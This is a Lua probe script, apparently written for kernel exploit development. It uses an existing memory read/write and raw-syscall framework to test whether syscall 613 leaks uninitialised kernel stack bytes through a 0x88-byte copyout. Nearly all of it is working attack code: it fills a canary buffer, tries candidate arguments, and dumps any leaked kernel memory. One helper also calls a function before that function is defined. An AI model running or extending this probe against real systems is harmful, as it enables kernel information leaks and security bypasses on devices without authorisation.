-- CRASH_CLASS: LOW
-- PROBE 1066a: sys 613 0x88-byte copyout - is any part left unwritten (stack leak)?
--
-- sys_613 (13.60 body 0xabca10..0xabcbf3) builds a 0x88 struct on the kernel
-- stack at &local_1a8 and copyout()s it to uap[1].  Two helpers whose bodies are
-- absent touch it.  If they write less than 0x88, the remainder is kernel stack.
-- Buffer is pre-filled with 0xAA so any untouched byte shows up.

print("=== PROBE 1066a: sys 613 0x88 copyout ===")
print("")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function make_syscall(num)
  local t={} for k,v in pairs(syscall.pipe) do t[k]=v end
  t.syscall_no=num setmetatable(t,getmetatable(syscall.pipe)) return t
end
local function as_addr(s) local m=s:match("0x[0-9a-fA-F]+") if not m then return 0 end return tonumber(m,16) or 0 end
local function a2h(a) return string.format("%08X%08X", math.floor(a/0x100000000), a % 0x100000000) end
local function hi_of(v) if type(v)=="table" and v.h then return to_num(v.h) end local h,l=get_hi_lo(v) return to_num(h) end
local function get_hi_lo(v) if type(v)=="table" and v.h then return v.h, v.l end return 0, v end
local function safe_rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return nil end
local function safe_wd(a,v) local ok=pcall(function() memory.write_dword(a,v) end) return ok end

local self=as_addr(tostring(syscall.pipe))
local pid=to_num(make_syscall(20)(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
print(string.format("[0] pid=%s pipe=%s", tostring(pid), a2h(self)))

local sc=make_syscall(613)
local buf=memory.alloc(0x200)
local base=as_addr(tostring(buf))
if base==0 then print("[X] buffer handle has no numeric address") return end

local function fill(tag)
  for o=0,0x1F8,4 do safe_wd(buf+o,0xAAAAAAAA) end
end
local function dump(tag)
  local left=0
  for o=0,0x87,4 do if safe_rd(buf+o)==0xAAAAAAAA then left=left+1 end end
  local row={}
  for o=0,0x88,8 do
    local lo=safe_rd(buf+o) or 0
    local hi=safe_rd(buf+o+4) or 0
    row[#row+1]=string.format("%s=%08X%08X", string.format("%02X",o), hi, lo)
  end
  print(string.format("[%s] untouched=%d/34", tag, left))
  for i=1,#row,2 do print("    "..row[i].."  "..(row[i+1] or "")) end
end

local cands={ {"zero",0}, {"one",1}, {"two",2}, {"pid",pid}, {"nil",0xFFFFFFFF}, {"sel0x10",0x10} }
for _,c in ipairs(cands) do
  fill(c[1])
  local rv=-999
  local ok,e=pcall(function() return sc(uint64(c[2]), uint64(base), uint64(0), uint64(0), uint64(0), uint64(0)) end)
  if ok then rv=to_num(e) end
  print(string.format(">%s arg0=0x%X rv=%s", c[1], c[2], tostring(rv)))
  if ok and rv==0 then dump(c[1]) end
end
print("[Z] alive pid="..tostring(pid))
